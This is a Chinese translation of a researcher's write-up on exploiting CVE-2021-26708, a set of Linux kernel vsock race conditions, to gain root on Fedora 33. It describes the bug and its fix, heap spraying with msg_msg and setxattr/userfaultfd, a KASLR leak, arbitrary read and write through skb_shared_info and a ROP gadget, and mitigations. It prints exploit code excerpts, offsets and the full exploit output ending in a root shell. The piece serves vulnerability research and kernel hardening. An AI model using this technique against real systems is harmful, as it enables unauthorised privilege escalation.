> 原文链接: https://www.anquanke.com//post/id/238141 


# 四字节的力量：在Linux内核中利用CVE-2021-26708


                                阅读量   
                                **530449**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者Alexander Popov，文章来源：a13xp0p0v.github.io
                                <br>原文地址：[https://a13xp0p0v.github.io/2021/02/09/CVE-2021-26708.html](https://a13xp0p0v.github.io/2021/02/09/CVE-2021-26708.html)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p1.ssl.qhimg.com/t01a0b8afe8e5b891d7.png)](https://p1.ssl.qhimg.com/t01a0b8afe8e5b891d7.png)



## 0x00 前言

[CVE-2021-26708](https://nvd.nist.gov/vuln/detail/CVE-2021-26708)描述为在Linux内核的虚拟套接字实现中的五个条件竞争漏洞。我在2021年1月发现并修复了它们。在这篇文章中，我将阐述如何利用它们在**Fedora 33 Server（x86_64）** 上绕过 **SMEP**和**SMAP** 进行本地提权。关于这个漏洞，我在Zer0Con 2021上进行了演讲(http://zer0con.org/#speaker-section)，PDF地址如下：https://a13xp0p0v.github.io/img/CVE-2021-26708.pdf 。

这个漏洞中，条件竞争可以被转化为有限的内存崩溃，进而再转化为对内核内存的任意读/写，最终完全控制系统。这就是为什么我把这篇文章命名为 “四字节的力量”。 POC 的演示视频地址为：[https://youtu.be/EC8PFOYOUgU](https://youtu.be/EC8PFOYOUgU) 。



## 0x01 脆弱点

这些漏洞是由[`net/vmw_vsock/af_vsock.c`](https://elixir.bootlin.com/linux/v5.10/source/net/vmw_vsock/af_vsock.c)中的错误锁定引起的条件竞争。这些条件竞争是在2019年11月添加`VSOCK`多传输支持的提交中隐式引入的，并被合并到Linux内核`5.5-rc1`版本中。

`CONFIG_VSOCKETS`和`CONFIG_VIRTIO_VSOCKETS`在所有主要的GNU/Linux发行版中都作为内核模块提供。当你为`AF_VSOCK`域创建一个套接字时，这些易受攻击的模块会自动加载。

```
vsock = socket(AF_VSOCK, SOCK_STREAM, 0);
```

`AF_VSOCK`套接字的创建对非特权用户来说是可用的，并不需要用户名空间。



## 0x02 漏洞及修复

我使用自定义配置的 [syzkaller fuzzer](https://github.com/google/syzkaller/)，在今年1月11日，发现在[`virtio_transport_notify_buffer_size()`](https://elixir.bootlin.com/linux/v5.10/source/net/vmw_vsock/virtio_transport_common.c#L490)中出现了可疑的内核崩溃。然而，fuzzer并没有重现这个崩溃，所以我开始检查源代码并进行漏洞的重现研究。

几天后，我发现`vsock_stream_setsockopt()`中的一个令人疑惑的漏洞，看起来似乎故意如此：

```
struct sock *sk;
    struct vsock_sock *vsk;
    const struct vsock_transport *transport;

    /* ... */

    sk = sock-&gt;sk;
    vsk = vsock_sk(sk);
    transport = vsk-&gt;transport;

    lock_sock(sk);
```

在调用`lock_sock()`之前，指向虚拟套接字传输的指针被复制到一个本地变量中。但是当套接字锁没有被获取时，`vsk-&gt;transport`的值可能会被改变！这是一个明显的条件竞争错误。我检查了整个`af_vsock.c`文件，又发现了四个类似的问题。

搜索git历史记录有助于了解原因。最初，虚拟套接字的传输是无法改变的，所以将`vsk-&gt;transport`的值复制到本地变量是安全的。后来，这个漏洞被隐式的引入进 commit [`c0cfa2d8a788fcf4`](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=c0cfa2d8a788fcf45df5bf4070ab2474c88d543a)(**vsock: add multi-transports support**)和commit [`6a2c0962105ae8ce`](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=6a2c0962105ae8ceba182c4f616e0e41d7755591) (**vsock: prevent transport modules unloading**)。

脆弱点的修复很简单：

```
sk = sock-&gt;sk;
    vsk = vsock_sk(sk);
-    transport = vsk-&gt;transport;

    lock_sock(sk);

+    transport = vsk-&gt;transport;
```



## 0x03 内存破坏

下面详细介绍[CVE-2021-26708](https://nvd.nist.gov/vuln/detail/CVE-2021-26708)的利用，利用了`vsock_stream_etssockopt()`中的条件竞争，复现需要两个线程，第一个线程调用`setsockopt()`：

```
setsockopt(vsock, PF_VSOCK, SO_VM_SOCKETS_BUFFER_SIZE,
                &amp;size, sizeof(unsigned long));
```

第二个线程在`vsock_stream_etssockopt()`试图获取套接字锁时改变虚拟套接字传输，通过重新连接虚拟套接字实现：

```
struct sockaddr_vm addr = `{`
        .svm_family = AF_VSOCK,
    `}`;

    addr.svm_cid = VMADDR_CID_LOCAL;
    connect(vsock, (struct sockaddr *)&amp;addr, sizeof(struct sockaddr_vm));

    addr.svm_cid = VMADDR_CID_HYPERVISOR;
    connect(vsock, (struct sockaddr *)&amp;addr, sizeof(struct sockaddr_vm));
```

为了处理虚拟套接字的 `connect()`，内核执行调用 `vsock_assign_transport()`的 `vsock_stream_connect()`。这个函数包含如下代码：

```
if (vsk-&gt;transport) `{`
            if (vsk-&gt;transport == new_transport)
                return 0;

            /* transport-&gt;release() must be called with sock lock acquired.
             * This path can only be taken during vsock_stream_connect(),
             * where we have already held the sock lock.
             * In the other cases, this function is called on a new socket
             * which is not assigned to any transport.
             */
            vsk-&gt;transport-&gt;release(vsk);
            vsock_deassign_transport(vsk);
        `}`
```

`vsock_stream_connect()`包含套接字锁，并行线程中的`vsock_stream_setsockopt()`也尝试获取它，构成条件竞争。因此，当用不同的`svm_cid`进行第二次`connect()`时，`vsock_deassign_transport()`函数被调用。该函数执行`virtio_transport_destruct()`，释放`vsock_sock.trans`，`vsk-&gt;transport`被设置为NULL。当`vsock_stream_connect()`释放套接字锁时，`vsock_stream_setsockopt()`可以继续执行。它调用`vsock_update_buffer_size()`，随后调用`transport-&gt;notify_buffer_size()`。这里`transport`包含一个来自本地变量的**过时的值**，与`vsk-&gt;transport`不匹配(本因被设为NULL)。

内核执行`virtio_transport_notify_buffer_size()`，出现内存破坏：

```
void virtio_transport_notify_buffer_size(struct vsock_sock *vsk, u64 *val)
`{`
    struct virtio_vsock_sock *vvs = vsk-&gt;trans;

    if (*val &gt; VIRTIO_VSOCK_MAX_BUF_SIZE)
        *val = VIRTIO_VSOCK_MAX_BUF_SIZE;

    vvs-&gt;buf_alloc = *val;

    virtio_transport_send_credit_update(vsk, VIRTIO_VSOCK_TYPE_STREAM, NULL);
`}`
```

这里，`vvs`是指向内核内存的指针，它已经在`virtio_transport_destruct()`中被释放。`struct virtio_vsock_sock`的大小为64字节，位于`kmalloc-64`块缓存中。`buf_alloc`字段类型为`u32`，位于偏移量40。`VIRTIO_VSOCK_MAX_BUF_SIZE`是`0xFFFFFFFFUL`。`*val`的值由攻击者控制，它的四个最不重要的字节被写入释放的内存中。



## 0x04 模糊测试

syzkaller fuzzer没有办法重现这个崩溃，于是我决定自行研究。但为什么fuzzer会失败呢？观察`vsock_update_buffer_size()`有所发现：

```
if (val != vsk-&gt;buffer_size &amp;&amp;
      transport &amp;&amp; transport-&gt;notify_buffer_size)
        transport-&gt;notify_buffer_size(vsk, &amp;val);

    vsk-&gt;buffer_size = val;
```

只有当`val`与当前的`buffer_size`不同时，才会调用`notify_buffer_size()`，也就是说`setsockopt()`执行`SO_VM_SOCKETS_BUFFER_SIZE`时，每次调用的`size`参数都应该不同。于是我构建了相关代码，地址为：[https://a13xp0p0v.github.io/img/vsock_racer.c：](https://a13xp0p0v.github.io/img/vsock_racer.c%EF%BC%9A)

```
struct timespec tp;
    unsigned long size = 0;

    clock_gettime(CLOCK_MONOTONIC, &amp;tp);
    size = tp.tv_nsec;
    setsockopt(vsock, PF_VSOCK, SO_VM_SOCKETS_BUFFER_SIZE,
                &amp;size, sizeof(unsigned long));
```

这里的`size`值取自`clock_gettime()`返回的纳秒数，每次都可能不同。原始的`syzkaller`不会这么处理，因为在`syzkaller`生成 fuzzing输入时，syscall参数的值被确定，执行时不会改变。



## 0x05 四字节的力量

这里我选择Fedora 33 Server作为研究目标，内核版本为`5.10.11-200.fc33.x86_64`，并决心绕过SMEP和SMAP。

第一步，我开始研究稳定的[堆喷射](https://en.wikipedia.org/wiki/Heap_spraying)，该漏洞利用执行用户空间的活动，使内核在释放的`virtio_vsock_sock`的位置分配另一个64字节的对象。经过几次实验性尝试后，确认释放的`virtio_vsock_sock`被覆盖，说明堆喷射是可行的。最终我找到了[`msgsnd()`](https://man7.org/linux/man-pages/man2/msgsnd.2.html) syscall。它在内核空间中创建了`struct msg_msg`，见`pahole`输出：

```
struct msg_msg `{`
    struct list_head           m_list;               /*     0    16 */
    long int                   m_type;               /*    16     8 */
    size_t                     m_ts;                 /*    24     8 */
    struct msg_msgseg *        next;                 /*    32     8 */
    void *                     security;             /*    40     8 */

    /* size: 48, cachelines: 1, members: 5 */
    /* last cacheline: 48 bytes */
`}`;
```

前面是消息头，后面是消息数据。如果用户空间中的`struct msgbuf`有一个16字节的`mtext`，则会在`kmalloc-64`块缓存中创建相应的`msg_msg`。4字节的write-after-free会破坏偏移量40的`void *security`指针。`msg_msg.security`字段指向由`lsm_msg_msg_alloc()`分配的内核数据，当收到 `msg_msg`时，就会被`security_msg_msg_free()`释放。因此，破坏`security`指针的前半部分，就能获得 arbitrary free。



## 0x06 内核信息泄露

这里使用了[CVE-2019-18683 exploit](https://a13xp0p0v.github.io/2020/02/15/CVE-2019-18683.html)相同的技巧。我在前面提到过，虚拟套接字的第二个`connect()`调用`vsock_deassign_transport()`，将`vsk-&gt;transport`设置为NULL，使得`vsock_stream_setsockopt()`在内存崩溃后调用`virtio_transport_send_pkt_info()`，出现内核告警：

```
WARNING: CPU: 1 PID: 6739 at net/vmw_vsock/virtio_transport_common.c:34
...
CPU: 1 PID: 6739 Comm: racer Tainted: G        W         5.10.11-200.fc33.x86_64 #1
Hardware name: QEMU Standard PC (Q35 + ICH9, 2009), BIOS 1.13.0-2.fc32 04/01/2014
RIP: 0010:virtio_transport_send_pkt_info+0x14d/0x180 [vmw_vsock_virtio_transport_common]
...
RSP: 0018:ffffc90000d07e10 EFLAGS: 00010246
RAX: 0000000000000000 RBX: ffff888103416ac0 RCX: ffff88811e845b80
RDX: 00000000ffffffff RSI: ffffc90000d07e58 RDI: ffff888103416ac0
RBP: 0000000000000000 R08: 00000000052008af R09: 0000000000000000
R10: 0000000000000126 R11: 0000000000000000 R12: 0000000000000008
R13: ffffc90000d07e58 R14: 0000000000000000 R15: ffff888103416ac0
FS:  00007f2f123d5640(0000) GS:ffff88817bd00000(0000) knlGS:0000000000000000
CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
CR2: 00007f81ffc2a000 CR3: 000000011db96004 CR4: 0000000000370ee0
Call Trace:
  virtio_transport_notify_buffer_size+0x60/0x70 [vmw_vsock_virtio_transport_common]
  vsock_update_buffer_size+0x5f/0x70 [vsock]
  vsock_stream_setsockopt+0x128/0x270 [vsock]
...
```

通过`gdb`调试，发现`RCX`寄存器包含了释放的`virtio_vsock_sock`的内核地址，`RBX`寄存器包含了`vsock_sock`的内核地址。



## 0x07 实现任意读

### <a class="reference-link" name="%E4%BB%8E%20arbitrary%20free%20%E5%88%B0%20use-after-free"></a>从 arbitrary free 到 use-after-free
1. 从泄露的内核地址释放一个对象
1. 执行堆喷，用受控数据覆盖该对象
1. 使用损坏的对象进行权限升级
内核实现的System V消息有限制最大值`DATALEN_MSG`，即`PAGE_SIZE`减去`sizeof(struct msg_msg))`。如果你发送了更大的消息，剩余的消息会被保存在消息段的列表中。`msg_msg`中包含`struct msg_msgseg *next`用于指向第一个段，`size_t m_ts`用于存储大小。当进行覆盖操作时，就可以把受控的值放在`msg_msg.m_ts`和`msg_msg.next`中：

[![](https://p4.ssl.qhimg.com/t01a51dfe7a996e854c.png)](https://p4.ssl.qhimg.com/t01a51dfe7a996e854c.png)

payload如下:

```
#define PAYLOAD_SZ 40 
    void adapt_xattr_vs_sysv_msg_spray(unsigned long kaddr)
    `{`
        struct msg_msg *msg_ptr;

        xattr_addr = spray_data + PAGE_SIZE * 4 - PAYLOAD_SZ;

        /* Don't touch the second part to avoid breaking page fault delivery */
        memset(spray_data, 0xa5, PAGE_SIZE * 4);

        printf("[+] adapt the msg_msg spraying payload:\n");
        msg_ptr = (struct msg_msg *)xattr_addr;
        msg_ptr-&gt;m_type = 0x1337;
        msg_ptr-&gt;m_ts = ARB_READ_SZ;
        msg_ptr-&gt;next = (struct msg_msgseg *)kaddr; /* set the segment ptr for arbitrary read */
        printf("\tmsg_ptr %p\n\tm_type %lx at %p\n\tm_ts %zu at %p\n\tmsgseg next %p at %p\n",
               msg_ptr,
               msg_ptr-&gt;m_type, &amp;(msg_ptr-&gt;m_type),
               msg_ptr-&gt;m_ts, &amp;(msg_ptr-&gt;m_ts),
               msg_ptr-&gt;next, &amp;(msg_ptr-&gt;next));
    `}`
```

但是如何使用`msg_msg`读取内核数据呢？通过阅读`msgrcv()`系统调用[文档](https://man7.org/linux/man-pages/man2/msgrcv.2.html)，我找到了好解决方案，使用`msgrcv()`和`MSG`标志：

```
MSG_COPY (since Linux 3.8)
        Nondestructively fetch a copy of the message at the ordinal position  in  the  queue
        specified by msgtyp (messages are considered to be numbered starting at 0).
```

这个标志使内核将消息数据复制到用户空间，不从消息队列中删除。如果内核有`CONFIG_CHECKPOINT_RESTORE=y`，则`MSG`是可用的，在Fedora Server适用。

### <a class="reference-link" name="%E4%BB%BB%E6%84%8F%E8%AF%BB%E7%9A%84%E6%AD%A5%E9%AA%A4"></a>任意读的步骤
<li>准备工作：
<ul>
1. 使用`sched_getaffinity()`和`CPU_COUNT()`计算可用的CPU数量（该漏洞至少需要两个）;
1. 打开`/dev/kmsg`进行解析;
<li>
`mmap()`将`spray_data`内存区域配置`userfaultfd()`作为最后一部分;</li>
1. 启动一个单独的`pthread`来处理`userfaultfd()`事件;
1. 启动127个`threads`用于`msg_msg`上的`setxattr()&amp;userfaultfd()`堆喷射，并将它们挂在`thread_barrier`上;
</ul>
</li>
<li>获取原始`msg_msg`的内核地址:
<ul>
1. 在虚拟套接字上进行条件竞争;
1. 在第二个`connect()`后，在忙循环中等待35微秒;
1. 调用`msgsnd()`来建立一个单独的消息队列；在内存破坏后，`msg_msg`对象被放置在`virtio_vsock_sock`位置;
1. 解析内核日志，从内核警告（`RCX`寄存器）中保存`msg_msg`的内核地址;
1. 同时，从`RBX`寄存器中保存`vsock_sock`的内核地址;
</ul>
</li>
<li>使用损坏的 `msg_msg`对原始`msg_msg`执行任意释放:
<ul>
1. 使用原始 `msg_msg`地址的4个字节作为 `SO_VM_SOCKETS_BUFFER_SIZE`，用于实现内存破坏；
1. 在虚拟套接字上进行条件竞争；
1. 在第二个`connect()`之后马上调用`msgsnd()`；`msg_msg`被放置在`virtio_vsock_sock`的位置，实现破坏；
<li>现在被破坏的`msg_msg`的`security`指针存储原始`msg_msg`的地址(来自步骤2)；[![](https://p5.ssl.qhimg.com/t01a2a2d47c9494c4a5.png)](https://p5.ssl.qhimg.com/t01a2a2d47c9494c4a5.png)
</li>
1. 如果在处理 `msgsnd()` 的过程中发生了来自 `setsockopt()`线程的 `msg_msg.security`内存损坏，进而SELinux权限检查失败；
1. 在这种情况下，`msgsnd()`返回`-1`，损坏的`msg_msg`被销毁；释放`msg_msg.security`可以释放原始`msg_msg`；
</ul>
</li>
<li>用一个可控的payload 覆盖原始`msg_msg`：
<ul>
<li>
`msgsnd()`失败后，漏洞就会调用`pthread_barrier_wait()`，调用127个用于堆喷射的`pthreads`；</li>
1. 这些`pthreads`执行`setxattr()`的payload；
<li>原始`msg_msg`被可控的数据覆盖，`msg_msg.next`指针存储`vsock_sock`对象的地址；[![](https://p2.ssl.qhimg.com/t0140baae964febb059.png)](https://p2.ssl.qhimg.com/t0140baae964febb059.png)
</li>
</ul>
</li>
<li>通过从存储被覆盖的 `msg_msg`的消息队列中接收消息，将`vsock_sock`内核对象的内容读到用户空间：
<pre><code class="hljs makefile">ret = msgrcv(msg_locations[0].msq_id, kmem, ARB_READ_SZ, 0,
                IPC_NOWAIT | MSG_COPY | MSG_NOERROR);
</code></pre>
</li>- 在虚拟套接字上进行条件竞争;
- 在第二个`connect()`后，在忙循环中等待35微秒;
- 调用`msgsnd()`来建立一个单独的消息队列；在内存破坏后，`msg_msg`对象被放置在`virtio_vsock_sock`位置;
- 解析内核日志，从内核警告（`RCX`寄存器）中保存`msg_msg`的内核地址;
- 同时，从`RBX`寄存器中保存`vsock_sock`的内核地址;<li>
`msgsnd()`失败后，漏洞就会调用`pthread_barrier_wait()`，调用127个用于堆喷射的`pthreads`；</li>
- 这些`pthreads`执行`setxattr()`的payload；
<li>原始`msg_msg`被可控的数据覆盖，`msg_msg.next`指针存储`vsock_sock`对象的地址；[![](https://p2.ssl.qhimg.com/t0140baae964febb059.png)](https://p2.ssl.qhimg.com/t0140baae964febb059.png)
</li>


## 0x08 寻找攻击目标

以下是我找到的点：<br>
1.专用的块缓存，如`PINGv6`和`sock_inode_cache`有很多指向对象的指针<br>
2.`struct mem_cgroup *sk_memcg`指针在`vsock_sock.sk`偏移量664处。`mem_cgroup`结构是在`kmalloc-4k`块缓存中分配的。<br>
3.`const struct cred *owner`指针在`vsock_sock.sk`偏移量840处，存储了可以覆盖进行权限升级的凭证的地址。<br>
4.`void (*sk_write_space)(struct sock *)`函数指针在`vsock_sock.sk`偏移量688处，被设置为`sock_def_write_space()`内核函数的地址。它可以用来计算`KASLR`偏移量。

下面是该漏洞如何从内存中提取这些指针:

```
#define SK_MEMCG_RD_LOCATION    (DATALEN_MSG + SK_MEMCG_OFFSET)
#define OWNER_CRED_OFFSET    840
#define OWNER_CRED_RD_LOCATION    (DATALEN_MSG + OWNER_CRED_OFFSET)
#define SK_WRITE_SPACE_OFFSET    688
#define SK_WRITE_SPACE_RD_LOCATION (DATALEN_MSG + SK_WRITE_SPACE_OFFSET) 
/*
 * From Linux kernel 5.10.11-200.fc33.x86_64:
 *   function pointer for calculating KASLR secret
 */
#define SOCK_DEF_WRITE_SPACE    0xffffffff819851b0lu 
unsigned long sk_memcg = 0;
unsigned long owner_cred = 0;
unsigned long sock_def_write_space = 0;
unsigned long kaslr_offset = 0;

/* ... */

    sk_memcg = kmem[SK_MEMCG_RD_LOCATION / sizeof(uint64_t)];
    printf("[+] Found sk_memcg %lx (offset %ld in the leaked kmem)\n",
            sk_memcg, SK_MEMCG_RD_LOCATION);

    owner_cred = kmem[OWNER_CRED_RD_LOCATION / sizeof(uint64_t)];
    printf("[+] Found owner cred %lx (offset %ld in the leaked kmem)\n",
            owner_cred, OWNER_CRED_RD_LOCATION);

    sock_def_write_space = kmem[SK_WRITE_SPACE_RD_LOCATION / sizeof(uint64_t)];
    printf("[+] Found sock_def_write_space %lx (offset %ld in the leaked kmem)\n",
            sock_def_write_space, SK_WRITE_SPACE_RD_LOCATION);

    kaslr_offset = sock_def_write_space - SOCK_DEF_WRITE_SPACE;
    printf("[+] Calculated kaslr offset: %lx\n", kaslr_offset);
```



## 0x09 在 sk_buff 上实现 Use-after-free

Linux内核中与网络相关的缓冲区用`struct sk_buff`表示，这个对象中有`skb_shared_info`与`destructor_arg`，可以用于控制流劫持。网络数据和`skb_shared_info`被放置在由`sk_buff.head`指向的同一个内核内存块中。因此，在用户空间中创建一个2800字节的网络数据包会使`skb_shared_info`被分配到`kmalloc-4k`块缓存中，`mem_cgroup`对象也是如此。

我构建了以下步骤：

1.使用`socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)`创建一个客户端套接字和32个服务器套接字

2.在用户空间中准备一个2800字节的缓冲区，并用**0x42**对其`memset()`

3.用`sendto()`将这个缓冲区从客户端套接字发送到每个服务器套接字，用于在`kmalloc-4k`中创建`sk_buff`对象。在每个可用的CPU上使用`sched_setaffinity()

4.对`vsock_sock`执行任意读取过程

5.计算可能的`sk_buff`内核地址为`sk_memcg`加4096(`kmalloc-4k`的下一个元素)

6.对这个可能的`sk_buff`地址执行任意读

7.如果在网络数据的位置找到**0x42424242424242lu**，则找到真正的`sk_buff`，进入**步骤8**。否则，在可能的`sk_buff`地址上加4096，转到**步骤6**

8.`sk_buff`上执行32个`pthreads`的`setxattr()&amp;userfaultfd()`堆喷射，并把它们挂在`pthread_barrier`上

9.对`sk_buff`内核地址进行任意释放

10.调用`pthread_barrier_wait()`，执行32个`setxattr()`覆盖`skb_shared_info`的堆喷`pthreads`

11.使用`recv()`接收服务器套接字的网络消息。



## 0x10 通过skb_shared_info 进行任意写

以下是覆盖`sk_buff`对象的有效payload：

```
#define SKB_SIZE        4096
#define SKB_SHINFO_OFFSET    3776
#define MY_UINFO_OFFSET        256
#define SKBTX_DEV_ZEROCOPY    (1 &lt;&lt; 3) 
void prepare_xattr_vs_skb_spray(void)
`{`
    struct skb_shared_info *info = NULL;

    xattr_addr = spray_data + PAGE_SIZE * 4 - SKB_SIZE + 4;

    /* Don't touch the second part to avoid breaking page fault delivery */
    memset(spray_data, 0x0, PAGE_SIZE * 4);

    info = (struct skb_shared_info *)(xattr_addr + SKB_SHINFO_OFFSET);
    info-&gt;tx_flags = SKBTX_DEV_ZEROCOPY;
    info-&gt;destructor_arg = uaf_write_value + MY_UINFO_OFFSET;

    uinfo_p = (struct ubuf_info *)(xattr_addr + MY_UINFO_OFFSET);
```

`skb_shared_info`驻留在喷射数据中，正好在偏移量`SKB_SHINFO_OFFSET`处，即3776字节。`skb_shared_info.destructor_arg`指针存储了`struct ubuf_info`的地址。因为被攻击的`sk_buff`的内核地址是已知的，所以能在网络缓冲区的`MY_UINFO_OFFSET`处创建了一个假的`ubuf_info`。下面是有效payload的布局：

[![](https://p0.ssl.qhimg.com/t0185ccbf9f025c74da.png)](https://p0.ssl.qhimg.com/t0185ccbf9f025c74da.png)

下面讲讲`destructor_arg` 回调:

```
/*
     * A single ROP gadget for arbitrary write:
     *   mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rdx + rcx*8], rsi ; ret
     * Here rdi stores uinfo_p address, rcx is 0, rsi is 1
     */
    uinfo_p-&gt;callback = ARBITRARY_WRITE_GADGET + kaslr_offset;
    uinfo_p-&gt;desc = owner_cred + CRED_EUID_EGID_OFFSET; /* value for "qword ptr [rdi + 8]" */
    uinfo_p-&gt;desc = uinfo_p-&gt;desc - 1; /* rsi value 1 should not get into euid */
```

由于在`vmlinuz-5.10.11-200.fc33.x86_64`中找不到一个能满足我需求的gadget，所以我自己进行了研究构造。

`callback`函数指针存储一个ROP gadget 地址，`RDI`存储`callback`函数的第一个参数，也就是`ubuf_info`本身的地址，`RDI + 8`指向`ubuf_info.desc`。gadget 将`ubuf_info.desc`移动到`RDX`。现在`RDX`包含有效用户ID和组ID的地址减一个字节。这个字节很重要：当gadget从 `RSI`向 `RDX`指向的内存中写入消息**1**时，有效的 `uid`和 `gid`将被零覆盖。重复同样的过程，直到权限升级到`root`。整个过程输出流如下：

```
[a13x@localhost ~]$ ./vsock_pwn

=================================================
==== CVE-2021-26708 PoC exploit by a13xp0p0v ====
=================================================

[+] begin as: uid=1000, euid=1000
[+] we have 2 CPUs for racing
[+] getting ready...
[+] remove old files for ftok()
[+] spray_data at 0x7f0d9111d000
[+] userfaultfd #1 is configured: start 0x7f0d91121000, len 0x1000
[+] fault_handler for uffd 38 is ready

[+] stage I: collect good msg_msg locations
[+] go racing, show wins: 
    save msg_msg ffff9125c25a4d00 in msq 11 in slot 0
    save msg_msg ffff9125c25a4640 in msq 12 in slot 1
    save msg_msg ffff9125c25a4780 in msq 22 in slot 2
    save msg_msg ffff9125c3668a40 in msq 78 in slot 3

[+] stage II: arbitrary free msg_msg using corrupted msg_msg
    kaddr for arb free: ffff9125c25a4d00
    kaddr for arb read: ffff9125c2035300
[+] adapt the msg_msg spraying payload:
    msg_ptr 0x7f0d91120fd8
    m_type 1337 at 0x7f0d91120fe8
    m_ts 6096 at 0x7f0d91120ff0
    msgseg next 0xffff9125c2035300 at 0x7f0d91120ff8
[+] go racing, show wins: 

[+] stage III: arbitrary read vsock via good overwritten msg_msg (msq 11)
[+] msgrcv returned 6096 bytes
[+] Found sk_memcg ffff9125c42f9000 (offset 4712 in the leaked kmem)
[+] Found owner cred ffff9125c3fd6e40 (offset 4888 in the leaked kmem)
[+] Found sock_def_write_space ffffffffab9851b0 (offset 4736 in the leaked kmem)
[+] Calculated kaslr offset: 2a000000

[+] stage IV: search sprayed skb near sk_memcg...
[+] checking possible skb location: ffff9125c42fa000
[+] stage IV part I: repeat arbitrary free msg_msg using corrupted msg_msg
    kaddr for arb free: ffff9125c25a4640
    kaddr for arb read: ffff9125c42fa030
[+] adapt the msg_msg spraying payload:
    msg_ptr 0x7f0d91120fd8
    m_type 1337 at 0x7f0d91120fe8
    m_ts 6096 at 0x7f0d91120ff0
    msgseg next 0xffff9125c42fa030 at 0x7f0d91120ff8
[+] go racing, show wins: 0 0 20 15 42 11 
[+] stage IV part II: arbitrary read skb via good overwritten msg_msg (msq 12)
[+] msgrcv returned 6096 bytes
[+] found a real skb

[+] stage V: try to do UAF on skb at ffff9125c42fa000
[+] skb payload:
    start at 0x7f0d91120004
    skb_shared_info at 0x7f0d91120ec4
    tx_flags 0x8
    destructor_arg 0xffff9125c42fa100
    callback 0xffffffffab64f6d4
    desc 0xffff9125c3fd6e53
[+] go racing, show wins: 15 

[+] stage VI: repeat UAF on skb at ffff9125c42fa000
[+] go racing, show wins: 0 12 13 15 3 12 4 16 17 18 9 47 5 12 13 9 13 19 9 10 13 15 12 13 15 17 30 

[+] finish as: uid=0, euid=0
[+] starting the root shell...
uid=0(root) gid=0(root) groups=0(root),1000(a13x) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
```



## 0x11 防范措施

以下技术可以防止[CVE-2021-26708](https://nvd.nist.gov/vuln/detail/CVE-2021-26708)，或使其难以被利用：

1.使用**Linux内核堆隔离**，因为内存损坏发生在条件竞争之后不久。参见[https://a13xp0p0v.github.io/2020/11/30/slab-quarantine.html](https://a13xp0p0v.github.io/2020/11/30/slab-quarantine.html)

2.grsecurity补丁中的`MODHARDEN`可以防止无权限的用户自动加载内核模块

3.将`/proc/sys/vm/unprivileged_userfaultfd`设置为`0`能阻止payload驻留在内核空间

4.将`kernel.dmesg_restrict` sysctl 设置为`1` 能阻止通过内核日志的信息泄露

5.控制流完整性技术（Control Flow Integrity）可以防止该 ROP gadget 调用。参见：[https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

6.希望未来的Linux内核版本能够支持[ARM内存标签扩展(MTE)](https://community.arm.com/developer/ip-products/processors/b/processors-ip-blog/posts/enhancing-memory-safety)来缓解ARM上的use-after-free

7.我还听说过一个叫做`AUTOSLAB`的[grsecurity](https://grsecurity.net/) 技术，它根据对象类型在块缓存的不同，分配内核对象。这可能会使该漏洞中使用的堆喷技术无效



## 0x12 结尾

研究、修复[CVE-2021-26708](https://nvd.nist.gov/vuln/detail/CVE-2021-26708)和开发POC是一个有趣而又疲惫的旅程。我在**Fedora 33 Server（x86_64)** 上绕过**SMEP**和**SMAP**，将一个内存破坏非常有限的条件竞争变成了对内核内存的任意读/写和权限升级。在这个研究过程中，实现了几个新的漏洞利用技巧，相信这篇文章够为改善内核安全提供新思路。
